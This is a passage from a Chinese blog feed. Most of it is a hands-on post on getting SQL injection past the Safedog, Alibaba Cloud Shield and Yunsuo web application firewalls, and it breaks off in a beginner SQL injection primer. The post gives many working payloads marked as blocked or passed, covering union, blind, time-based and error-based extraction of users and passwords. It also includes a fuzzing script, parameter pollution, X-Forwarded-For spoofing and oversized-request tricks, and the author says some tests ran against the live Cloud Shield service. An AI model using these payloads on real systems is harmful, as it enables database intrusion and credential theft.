or</p>\n</li>\n<li>\n<p>带入的不是字符串和数字型，带入一个特殊符号</p>\n</li>\n</ol>\n<p>针对第一种我们可以去看看运算符号 随便找到几个 <code>| ^ xor &amp; / * &amp;&amp; ||</code>  等等还有很多</p>\n<pre><code>mysql&gt; select '1'|1;\n+-------+\n| '1'|1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\n\nmysql&gt; select '1'&amp;1;\n+-------+\n| '1'&amp;1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\nmysql&gt; select '1'^1;\n+-------+\n| '1'^1 |\n+-------+\n|     0 |\n+-------+\n1 row in set (0.00 sec)\n\n\n</code></pre>\n<p>知道这个了我们带入我们的语法就很简单了 通过运算符来改变 ID 的值 查看页面是否变化 这是可行的。</p>\n<pre><code>mysql&gt; select * from admin where id ='1'|2-- +';\n    -&gt; ;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from admin where id ='1'|1-- +';\n    -&gt; ;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n</code></pre>\n<p>经过测试你还会发现他的正则不全 <code>&amp;&amp; true</code>  也是可以的。</p>\n<p>那我们可以不可以正面刚 <code>and</code>   <code>or</code>  呢，当然也是可行的，前面我们测试过  <code>and hex(1)</code>  不拦截其实已经可以拿来判断了，但是我们还要深入的探究</p>\n<p><code>and hex(1)=</code>  也是不拦截的 但是后面加入字符型和数字型他又开始拦截，所以我们可以猜测 他判断 = 左右的字符类型，经过测试就能出来很多我们想要的</p>\n<pre><code>and ~1&gt;1\n\nand hex(1)&gt;-1\n\nand hex(1)&gt;~1\n\n</code></pre>\n<p>再深入探究 你就会发现 安全狗他只在乎 数字型的正数，而不在乎负数，也就是 <code>and -2&lt;-1</code>  就能过狗，也可能是 <code>-</code>  绕过了他的正则</p>\n<h1 id=\"0x02-探索-union-select\"><a class=\"anchor\" href=\"#0x02-探索-union-select\">#</a> 0x02 探索 union select</h1>\n<ol>\n<li>内联注释绕过</li>\n</ol>\n<pre><code>union    不拦截\nselect   不拦截\nunion select 拦截\nunion 各种字符 select 拦截\nunion/*select*/ 不拦截\n\n</code></pre>\n<p>通过简单的测试我们发现安全狗还是认识我们我们的注释的符号的，所以我们就需要通过这个来绕过我们的安全狗，前面符号一章我讲过注释符号的几种，我们主要使用的是</p>\n<p>内联注释  <code>/*!/*!*/</code></p>\n<pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!50000select*/ 1,2,3--+  拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!/*!5select*/ 1,2,3--+  不拦截\n\n\n</code></pre>\n<p>为什么不拦截 ，因为 50000 是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用 burp 来遍历这个值呢，结果的确是我们想要的</p>\n<pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!11441/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=-1' union/*!11440/**/%0aselect*/ 1,2,3--+  不拦截\n\n</code></pre>\n<p>这句 bypass 的核心就在于版本号，然后你就感觉 fuzz 了千种姿势，但是核心还是这个，最简也是这个，万变不离其宗。<br />\n2. 注释绕过</p>\n<p>联想注释我们还知道有 -- # 那么他们可以利用吗，当然是肯定的，其实很久以前就有大佬发过这个语句了是<br />\n <code>union %23%0aselect</code>  因为这些都是单行注释，而 %0a 是换行的 url 编码，大家可以换行后用 url 编码看看，就是这个，<br />\n但是这样已经被加入规则库了，如何绕过呢 非常简单 当然这是个 fuzz 的过程，其实我只想写出思路，而不是直接给 payload。</p>\n<pre><code>union %23%0aselect 拦截\n\nunion %23select 拦截\n\nunion a%23 select 不拦截\n\nunion all%23 select 不拦截\n\nunion all%23%0a select 不拦截\n\nunion %23%0aall select 不拦截\n\n\n</code></pre>\n<p>有时候 fuzz 右边不行 不如看看左边 为什么可以加 all 这个你就得看看 mysql 手册了，其实测试到最后发现 %23%0a 中间不能加字符否则会被拦截。</p>\n<ol start=\"3\">\n<li>-- 注释绕过</li>\n</ol>\n<p>-- 其实大佬们也一样很早说了不过最初的姿势是  <code>-- %0a</code>  当然已经被加入豪华午餐了，所以我们来测试</p>\n<pre><code>union all -- %0a select 拦截\n\nunion  -- ()%0a select 拦截\n\nunion  -- 1%0a select 不拦截\n\nunion  -- hex()%0a select 不拦截\n\n</code></pre>\n<p>懂我意思吧，怎么绕出来，发挥你的现象，总之俩开花。</p>\n<ol start=\"4\">\n<li>老生常谈 hpp 被人遗忘的手法</li>\n</ol>\n<p>前面说过  <code>/**/</code>  里面的内容安全狗基本不管了，那么我们用 hpp 参数污染来绕过就很简单了<br />\n照成这个手法的原因是 web server 对参数的解析问题 在 php/apache 中 它总解析最后一个 id</p>\n<pre><code>http://192.168.59.129/Less-1/?id=-1' /*&amp;id='union select 1,user(),3 -- +*/\n\n</code></pre>\n<h1 id=\"0x03-注入\"><a class=\"anchor\" href=\"#0x03-注入\">#</a> 0x03 注入</h1>\n<p>既然绕过了  <code>union select</code>  那么注入就简单了 首先来看个  <code>user()</code>  , 因为它是被拦截的所以我们需要简单的绕过它</p>\n<pre><code>user()   拦截\nuser/**/() 拦截\nuser/**/(/**/) 拦截\nhex(user/**/(/**/)) 不拦截\n\n</code></pre>\n<p>接着就是爆库名</p>\n<pre><code>union  -- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1\n\n</code></pre>\n<p>接下来的流传都差不多了 关键点就是在于 from 后面这块 后面的我以这个  <code>information_schema.schemata</code>  为例展示几种思路可能有的不能过</p>\n<pre><code>`information_schema`.schemata\n`information_schema`.`schemata`\ninformation_schema.`schemata`\n(information_schema.schemata)\ninformation_schema/**/.schemata\n\n</code></pre>\n<h1 id=\"0x04-文末\"><a class=\"anchor\" href=\"#0x04-文末\">#</a> 0x04 文末</h1>\n<p>这么多手法又有多少人认真看了呢，认真去试过，探索。</p>\n<h1 id=\"0x00-延时过狗\"><a class=\"anchor\" href=\"#0x00-延时过狗\">#</a> 0x00 延时过狗</h1>\n<p>盲注过狗相对联合注入来说，感觉上是更简单，我们先来试试时间盲注把，比布尔稍稍灵活一点</p>\n<pre><code> if(1,1,1) 不拦截\n a if(1,1,1) 不拦截\n and if(1,1,1) 拦截\n | if(1,1,1) 不拦截\n || if(1,1,1) 拦截\n &amp;&amp; if(1,1,1) 拦截\n/*!and*/ if(1,1,1) 拦截\n /*!11440and*/ if(1,1,1) 不拦截\n andaif(1,1,1) 不拦截\n\n</code></pre>\n<p>通过上面的测试我们其实可以很简单的看出来 他是拦截的 xx if 这个语句，其中 xx 为 and 和 or 这 2 个词有点敏感，但是绕过还是可以的</p>\n<p>通过上一章的测试语句 发现版本为 11440 的 内联注释直接放行，咳咳这样后面就直接注入，感觉并不是我们这一章想要的，我们这一章来试试不用内联注释内不内绕过</p>\n<p>查阅乌云知识库发现一个小知识点  <code>and!!!1=1</code>  and 后面可以接上奇数个特殊的字符包括不限于 <code>! ~ &amp; -</code>  其他还可以自己测试 那么我们的 payload 就能构造出来了</p>\n<pre><code>and!!!if((substr((select hex(user/**/(/*!*/))),1,1)&gt;1),sleep/**/(/*!5*/),1)\n\n</code></pre>\n<p>系统函数怎绕过我就不多说了每一张就有</p>\n<h1 id=\"0x01-布尔过狗\"><a class=\"anchor\" href=\"#0x01-布尔过狗\">#</a> 0x01 布尔过狗</h1>\n<p>布尔注入过狗只能说是相对来说最简单的吧，因为可以不使用条件语句，少了一个绕过点</p>\n<pre><code>and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)='r' 拦截\n\nand!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=r 不拦截\n\nand!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1 不拦截\n\n\n</code></pre>\n<p>上面忘了说的就是这个点 =r 这里 不能使用引号，那绕过他就很简单了 什么 HEX ASCII 都行，通过测试发现 使用布尔盲注 他的过滤真的很差，我们试试 把 and 换成 &amp;&amp;</p>\n<pre><code>and substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n/*!and*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n%26%26 substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 不拦截\n\n</code></pre>\n<h1 id=\"0x02-文末-3\"><a class=\"anchor\" href=\"#0x02-文末-3\">#</a> 0x02 文末</h1>\n<p>自己不测试 永远发现不了新东西</p>\n<h1 id=\"0x00-探索报错\"><a class=\"anchor\" href=\"#0x00-探索报错\">#</a> 0x00 探索报错</h1>\n<p>报错注入的绕过，感觉很少人提过，不少人绕过也有一定的误区吧，这里提一提</p>\n<pre><code>updatexml 不拦截\n\nupdatexml(1,2,3 不拦截\n\nupdatexml(1,2) 不拦截\n\nupdatexml(1,2,) 不拦截\n\nupdatexml(,2,1) 不拦截\n\nupdatexml(1,2,!) 拦截\n\nupdatexml(1,2,%) 拦截\n\nupdatexml(,2,1,hex()) 拦截\n\nand updatexml(1,2,3 不拦截\n\nupdatexml(1,2,3) 拦截\n\nand updatexml(1,2,3) 拦截\n\n\n</code></pre>\n<p>到这里我们 大概知道了，他的判断   <code>updatexml()</code>  的完整性 ，当里面按逗号分割出现出现 3 个字符时，就会拦截，当然有个别特殊的字符串他没过滤</p>\n<p>这样我们在括号里面做手脚的可能性很渺茫，那么我们还有 什么方法呢， 可以尝试把  <code>updatexml()</code>  函数分开，或者给 updatexml 加个外套。</p>\n<pre><code> /*updatexml*/(1,1,1) 不拦截\n\n /*!updatexml*/(1,1,1) 拦截\n\n /*!5000updatexml*/(1,1,1) 不拦截\n\n /*!11440updatexml*/(1,1,1) 不拦截\n\n</code></pre>\n<p>看来  <code>updatexml()</code>  函数我们已经绕过了 需要前面加个 运算符号了</p>\n<pre><code>and /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)  拦截\n\nor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截\n\n/*!and*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截\n\n/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n</code></pre>\n<p>那么有没有什么可以包裹他的呢，其实我们查看 mysql 手册找到这么一个符号 开单引号 ASCII 96</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1' and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +\n\n</code></pre>\n<p>那么我们写个小脚本跑看看 还有没有</p>\n<pre><code>import requests\nimport urllib\n\nfor i in range(0,177):\n    url = r&quot;http://192.168.130.135/Less-1/?id=1%27%20xor%20&#123;fuzz&#125;updatexml&#123;fuzz&#125;(1,(select hex(user/**/(/**/))),1)--%20+&quot;.format(fuzz=urllib.quote(chr(i)))\n    req = requests.get(url)\n    if &quot;F6F7&quot; in req.text:\n        print len(req.text),i,urllib.quote(chr(i))\n\n</code></pre>\n<p>发现确实没有其他利用的了，当然你用前面的注释方法也是可行的</p>\n<h1 id=\"0x01-文末\"><a class=\"anchor\" href=\"#0x01-文末\">#</a> 0x01 文末</h1>\n<p>脚本只是你的一个思路衍生</p>\n<h1 id=\"0x00-矛与云盾过狗\"><a class=\"anchor\" href=\"#0x00-矛与云盾过狗\">#</a> 0x00 矛与云盾过狗</h1>\n<p>由于没有阿里云盾的试验环境，以下操作都在线上测试，总的来说阿里云还是比较不好绕的，因为对于 <code>/**/  /*!*/</code>  他是强过滤，根本不能用，我们先来测试简单语句</p>\n<pre><code>and 1=1 拦截\n\n&amp;&amp; 1=1 不拦截\n\nor 1=1 拦截\n\n|| 1=1 不拦截\n\nand 1 不拦截\n\nand 1= 拦截\n\nand = 拦截\n\nand 1&gt; 不拦截\n\nand 1&gt;1 拦截\n\nand 1&gt;a 拦截\n\nand 1&gt;! 不拦截\n\n</code></pre>\n<p>通过简单的测试我们发现，他对 &amp;&amp; || 过滤还是不是很严 ，and 的话是不让用直接接入 = 号的，综合一下前面的知识，我们可以想到几个方法。</p>\n<ol>\n<li>\n<p>不用 and 和 or</p>\n</li>\n<li>\n<p>用 and 在两边接入干扰字符</p>\n</li>\n</ol>\n<pre><code>and ~1=1   不拦截\n\nand!!!1=1  不拦截\n\nand 1-1    不拦截\n\nand true 不拦截\n\nand 1 不拦截\n\n</code></pre>\n<h1 id=\"0x01-注入\"><a class=\"anchor\" href=\"#0x01-注入\">#</a> 0x01 注入</h1>\n<ol>\n<li>盲注</li>\n</ol>\n<pre><code> and substr(1,1,1)='r' 拦截\n\n &amp;&amp;  substr(1,1,1)='r'  不拦截\n\n and!!!substr(1,1,1)='r' 不拦截\n\n and!!!substr((select),1,1)='r' 不拦截\n\n and!!!substr((select a()),1,1)='r' 不拦截\n\n and!!!substr((select user()),1,1)='r' 拦截\n\n\n</code></pre>\n<p>可以知道 select 后面加入 常见函数会被拦截，所以我们可以 使用一定的东西来分割他 但是 <code>/**/</code>  和 <code>/*!*/</code>  是不能用的，所以最后想到 就是 注释符号</p>\n<pre><code>and!!!substr((select user-- (1)%0a()),1,1)='r' 不拦截  edu\n\n\n</code></pre>\n<p>测试一会儿发现他对某些关键词拦截还是很严格的，绕过应该是可以的，一些生僻的函数加点东西 他就不会拦截</p>\n<pre><code>and!!!substr((select @@`datadir`),1,1)='D'-- + 拦截                     yq\nand!!!substr((select&#123;x @@datadir&#125;),1,1)='D' 不拦截\nand!!!substr((select&#123;x @@`datadir`&#125;),1,1)='D'-- + 不拦截\n\n</code></pre>\n<p>这里比较难的是 from 的绕过，虽然最后绕过了，但是感觉不是很完美</p>\n<pre><code>from 不拦截\n\nfrom user 不拦截\n\nselect from user 拦截                edu\n\nselect all from user 拦截\n\nselect from(user) 拦截\n\nselect from&#123;user&#125; 拦截\n\nselect from[user] 不拦截\n\nselect from [user] 拦截\n\n\n\n</code></pre>\n<p>最后想到 web+mysql 好像编码的问题 也能让解析我们的中文字符 但是这种对环境要求比较大</p>\n<pre><code>and!!!substr((select&#123;x username&#125;from（users） limit 0,1),1,1)='D'\n\nhttp://127.0.0.1/sqli/Less-1/?id=1%27 and!!!substr((select username from【users】 limit 0,1),3,1)='m'-- +\n\n</code></pre>\n<ol start=\"2\">\n<li>联合</li>\n</ol>\n<p>前面测试发现 内联注释不能使用了，只能靠括号之类的来干扰了</p>\n<pre><code>union select   不拦截\n\nunion select 1 拦截\n\nunion(select 1) 不拦截\n\nunion(select 1,2,3) 不拦截\n\n</code></pre>\n<ol start=\"3\">\n<li>报错</li>\n</ol>\n<pre><code>and `updatexml`(1,select `user`%0a(),1) \n</code></pre>\n<p><img data-src=\"2.4.1.png\" alt=\"mysql\" /></p>\n<p><img data-src=\"2.4.2.png\" alt=\"mysql\" /></p>\n<p>阿里云的需要深度探索才能绕过，规则还是比较困难的，相对于安全狗，因为 edu 和 yq 的云盾好像版本不同，绕过的手法也要不一样，具体思路就是这样的，由于我直接在官网测试的，所以可能有点问题。</p>\n<h1 id=\"我与云锁有个约会\"><a class=\"anchor\" href=\"#我与云锁有个约会\">#</a> 我与云锁有个约会</h1>\n<h2 id=\"0x00-简单and探索\"><a class=\"anchor\" href=\"#0x00-简单and探索\">#</a> 0x00 简单 and 探索</h2>\n<p>首先都是来测试下 and 的绕过</p>\n<pre><code>and 不拦截\n\nand 1 拦截\n\nand a 不拦截\n\nand 'a' 不拦截\n\nand 'a' &gt; &lt; =  拦截\n\n</code></pre>\n<p>差不多知道他的规则了 绕过来就很简单了</p>\n<pre><code>mysql&gt; select 'a'-0;\n+-------+\n| 'a'-0 |\n+-------+\n|     0 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select 'a'+1;\n+-------+\n| 'a'+1 |\n+-------+\n|     1 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select 'a'|1;\n+-------+\n| 'a'|1 |\n+-------+\n|     1 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\n\nand 'a'-0  不拦截\n\nand 'a'|1  不拦截\n\n</code></pre>\n<h2 id=\"0x01-我与云锁有个约会\"><a class=\"anchor\" href=\"#0x01-我与云锁有个约会\">#</a> 0x01 我与云锁有个约会</h2>\n<p>早期云锁绕过非常简单，只需要在 post 和 get 同时提交数据 他会只检测 post 的内容，很轻松的绕过，但是更新后云锁也是很多人谈之色变的。</p>\n<p>以下内容都是把云锁的增强型防护开启</p>\n<ol>\n<li>简单的布尔盲注</li>\n</ol>\n<pre><code>and strcmp((substr((select user/**/()),2,1)),'0')\n\n</code></pre>\n<p>生僻函数绕过 这里比较难的点其实也在 from，但是比云盾好点，毕竟可以用到注释</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select from),2,1)),'0')-- +  拦截\n\nhttp://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select /*from*/),2,1)),'0')-- + 不拦截\n\n</code></pre>\n<p>看到这两条语句其实我们可以清楚的知道 <code>/**/</code>  是我们可以利用的点，结合前面的知识我们只需要把我们的 from 放在注释里面然后把注释不起作用就 OK</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')-- +\n\n</code></pre>\n<p><img data-src=\"2.5.1.png\" alt=\"mysql\" /></p>\n<ol start=\"2\">\n<li>时间盲注</li>\n</ol>\n<p>时间盲注换换就行</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')),1,sleep(5))-- +\n\n</code></pre>\n<ol start=\"3\">\n<li>报错注入</li>\n</ol>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and `updatexml`(1,concat(0x7e,(select user/**/()),0x7e),1)/**/-- +\n\n</code></pre>\n<p>其他的自己探索吧，bypass 也就一个知识量和思路的结合</p>\n<p><img data-src=\"2.5.2.png\" alt=\"mysql\" /></p>\n<h1 id=\"0x00-拓展bypass的常用思路\"><a class=\"anchor\" href=\"#0x00-拓展bypass的常用思路\">#</a> 0x00 拓展 Bypass 的常用思路</h1>\n<p>WAF 的绕过我们无非就是利用 WEB 程序缺陷，容器特性，网络协议，数据库特性来组合利用绕过，从用户发出请求到数据库的每一点，寻找突破口。</p>\n<h1 id=\"0x01-常见的手段\"><a class=\"anchor\" href=\"#0x01-常见的手段\">#</a> 0x01 常见的手段</h1>\n<ol>\n<li>\n<p>HTTP 协议</p>\n</li>\n<li>\n<p>大小混写</p>\n</li>\n<li>\n<p>替换</p>\n</li>\n<li>\n<p>使用特殊字符</p>\n</li>\n<li>\n<p>使用编码</p>\n</li>\n<li>\n<p>等价替换</p>\n</li>\n<li>\n<p>容器特性</p>\n</li>\n<li>\n<p>白名单</p>\n</li>\n<li>\n<p>缓冲溢出</p>\n</li>\n</ol>\n<p>等等</p>\n<h2 id=\"http协议\"><a class=\"anchor\" href=\"#http协议\">#</a> HTTP 协议</h2>\n<p>HTTP 协议中有很多功能，一般来说我们可以用到的就是编码功能，后来有大佬发现了分块传入来绕过 WAF，具体大家可以百度看看，大概 http 协议我们可以总结如下。</p>\n<ol>\n<li>\n<p>构造畸形数据包</p>\n</li>\n<li>\n<p>编码</p>\n</li>\n<li>\n<p>分块</p>\n</li>\n<li>\n<p>数据包溢出</p>\n</li>\n</ol>\n<p>可能有些表述有误，但是大概意思如此，构造畸形数据包的原理是 http 协议是有一定的容错性的，我们也常用这个容错性去绕过上传。编码绕过的原理也是利用程序解密，而 waf 识别不了，数据包溢出则是数据包过大 waf 自动丢弃不识别</p>\n<h2 id=\"大小混写\"><a class=\"anchor\" href=\"#大小混写\">#</a> 大小混写</h2>\n<p>大小混写一般是绕过一些简单的正则 ，对大小写敏感的。</p>\n<pre><code>UnIon SlEct \n\n</code></pre>\n<h2 id=\"替换\"><a class=\"anchor\" href=\"#替换\">#</a> 替换</h2>\n<p>这种一般是因为正则吧我们的关键词给替换删除了，但是没有进行多次匹配导致绕过</p>\n<pre><code>ununionion seselectlect\n\nun/**/ion se/**/lect\n\n</code></pre>\n<h2 id=\"特殊字符\"><a class=\"anchor\" href=\"#特殊字符\">#</a> 特殊字符</h2>\n<p>特殊符号也多是数据库的特性，利用数据库可以使用多种符号来绕过，多种的运算符</p>\n<pre><code>`updatexml`\n\nand!!!1=1\n\n/**/\n\n/*!50000*/\n\n</code></pre>\n<h2 id=\"使用编码\"><a class=\"anchor\" href=\"#使用编码\">#</a> 使用编码</h2>\n<p>这里和 http 协议差不多，多重编码等等，url 编码会自己解码一次，但是有的程序他可以自己多次解密，那么我们就可以拿来利用<br />\n还有的程序参数他是支持 base64 的 那么我们的 payload 就可以编码绕过了</p>\n<pre><code>= -&gt; %3D -&gt;%25%33%44\n\nand 1=1 -&gt; YW5kIDE9MQ==\n\n</code></pre>\n<h2 id=\"等价替换\"><a class=\"anchor\" href=\"#等价替换\">#</a> 等价替换</h2>\n<p>mysql 众多的函数也我们的 bypass 带来了很对便利，比如一个分割字符串的函数都是几个，倘若被过滤一个可以换成其他的</p>\n<pre><code>substr(version(),1,1)\nSubstring(version(),1,1)\nLeft(version(),1)\n\n</code></pre>\n<h2 id=\"容器特性\"><a class=\"anchor\" href=\"#容器特性\">#</a> 容器特性</h2>\n<ol>\n<li>iis</li>\n</ol>\n<p>容器的特性给我们绕过非常的有帮助，感谢那些善于发现的师傅们。</p>\n<pre><code>iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select\niis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select\n\n    +--------------------------------------------------------------------+\n    |   Keywords     |        WAF             |  ASP/ASP.NET             |\n    +--------------------------------------------------------------------+\n    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |\n    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |\n    | &lt;scr%ipt&gt;      | &lt;scr%ipt&gt;                  | &lt;script&gt;             |\n    | &lt;if%rame&gt;      | &lt;if%rame&gt;                  | &lt;iframe&gt;             |\n    +--------------------------------------------------------------------+\n\n</code></pre>\n<ol start=\"2\">\n<li>hpp</li>\n</ol>\n<p>hpp 参数污染，前面我们绕过安全狗用到过，不同容器对我们传入的值解析顺序不同，这也是我们可以利用的</p>\n<pre><code>    php+apache    &amp;id=1&amp;id=2     他只解析最后一个\n\n\n    +------------------------------------------------------------------+\n    | Web Server      | Parameter Interpretation         | Example     |\n    +------------------------------------------------------------------+\n    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |\n    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |\n    | PHP/Apache      | The last param is resulting  | par1=val2       |\n    | JSP/Tomcat      | The first param is resulting | par1=val1       |\n    | Perl/Apache     | The first param is resulting | par1=val1       |\n    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |\n    +------------------------------------------------------------------+\n\n</code></pre>\n<ol start=\"3\">\n<li>HTTP Parameter Contamination</li>\n</ol>\n<p>不同的容器他会对我们的参数带入的一些特殊字符解析成不同的东西，比如</p>\n<pre><code>    +-----------------------------------------------------------+\n    | Query String    |    Web Servers response / GET values    |\n    +-----------------------------------------------------------+\n    |         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |\n    +-----------------------------------------------------------+\n    | ?test[1=2       | test_1=2             | test[1=2         |\n    | ?test=%         | test=%               | test=            |\n    | ?test%00=1      | test=1               | test=1           |\n    | ?test=1%001     | NULL                 | test=1           |\n    | ?test+d=1+2     | test_d=1 2           | test d=1 2       |\n    +-----------------------------------------------------------+\n\n</code></pre>\n<h2 id=\"白名单\"><a class=\"anchor\" href=\"#白名单\">#</a> 白名单</h2>\n<p>有的程序他会对本地 ip 不拦截，同时他的 host 使用 <code>X-Forwarded-For</code>  等来获取</p>\n<pre><code>X-Forwarded-For:127.0.0.1\n\n</code></pre>\n<h2 id=\"缓冲溢出\"><a class=\"anchor\" href=\"#缓冲溢出\">#</a> 缓冲溢出</h2>\n<p>waf 他处理数据包的大小有限，早期安全狗你提交过长 url 会直接奔溃</p>\n<pre><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n\n</code></pre>\n<h2 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h2>\n<ol>\n<li>\n<p>Obfuscate and Bypass ： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcGFwZXJzLzE3OTM0\">https://www.exploit-db.com/papers/17934</span></p>\n</li>\n<li>\n<p>9 ways to bypass Web Application Firewall：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGlnaXRhbG11bml0aW9uLm1lLzIwMTgvMDIvc3FsLWluamVjdGlvbi05LXdheXMtYnlwYXNzLXdlYi1hcHBsaWNhdGlvbi1maXJld2FsbC8=\">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</span></p>\n</li>\n</ol>\n<h1 id=\"0x02-文末-4\"><a class=\"anchor\" href=\"#0x02-文末-4\">#</a> 0x02 文末</h1>\n<p>bypass 不要局限与一种，多种组合才能最大利用，你需要了解 mysql 的语法，特殊的符号，特殊的写法，FUZZ 他可以容错的地方</p>\n",
            "tags": [
                "sql注入"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/",
            "title": "初学SQLinjection",
            "date_published": "2020-12-02T03:46:32.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>内容是网上收集的，可能存在错误</p>\n</blockquote>\n<h1 id=\"sqlinjection-原理\"><a class=\"anchor\" href=\"#sqlinjection-原理\">#</a> SQLinjection 原理</h1>\n<p>用户【可控参数】中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。</p>\n<p>其原因可以归结为以下两个原因叠加造成的：</p>\n<ol>\n<li>程序编写者在处理程序和数据库交互时，使用【字符串拼接】的方式构造 SQL 语句。</li>\n<li>未对【用户可控参数】进行足够的过滤便将参数内容拼接到 SQL 查询语句中。</li>\n</ol>\n<h1 id=\"sql注入的分类\"><a class=\"anchor\" href=\"#sql注入的分类\">#</a> SQL 注入的分类</h1>\n<p>在《web 安全深度剖析》这本书中作者张炳帅前辈认为 SQL 注入只分为数字型与字符型，其他的注入不过是这两大类型的不同展现形式，或不同展现位置罢了。<br />\n这些都是前辈们的总结</p>\n<ol>\n<li>\n<p><strong>按变量类型分类</strong></p>\n<ul>\n<li>数字型</li>\n<li>字符型</li>\n</ul>\n</li>\n<li>\n<p><strong>按 HTTP 提交方式分类</strong></p>\n<ul>\n<li>GET 注入</li>\n<li>POST 注入</li>\n<li>Cookie 注入</li>\n</ul>\n</li>\n<li>\n<p><strong>按注入方式分类</strong></p>\n<ul>\n<li>报错注入</li>\n<li>盲注</li>\n<li>布尔盲注</li>\n<li>时间盲注</li>\n<li>union 注入</li>\n</ul>\n</li>\n<li>\n<p><strong>编码问题</strong></p>\n<ul>\n<li>宽字节注入</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"mysql-50以上和mysql-50以下版本的区别\"><a class=\"anchor\" href=\"#mysql-50以上和mysql-50以下版本的区别\">#</a> MySQL 5.0 以上和 MySQL 5.0 以下版本的区别</h1>\n<p>MySQL 5.0 以上版本存在一个存储着数据库信息的信息数据库 --INFORMATION_SCHEMA ，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而 5.0 以下没有。</p>\n<h2 id=\"information_schema-库\"><a class=\"anchor\" href=\"#information_schema-库\">#</a> INFORMATION_SCHEMA 库</h2>\n<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>\n<h3 id=\"schemata表\"><a class=\"anchor\" href=\"#schemata表\">#</a> SCHEMATA 表</h3>\n<p>储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库库名的字段名为 SCHEMA_NAME。</p>\n</blockquote>\n<h3 id=\"tables表\"><a class=\"anchor\" href=\"#tables表\">#</a> TABLES 表</h3>\n<p>储存 mysql 中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库名和表名的字段名分别为 TABLE_SCHEMA 和 TABLE_NAME。</p>\n</blockquote>\n<h3 id=\"columns表\"><a class=\"anchor\" href=\"#columns表\">#</a> COLUMNS 表</h3>\n<p>储存 mysql 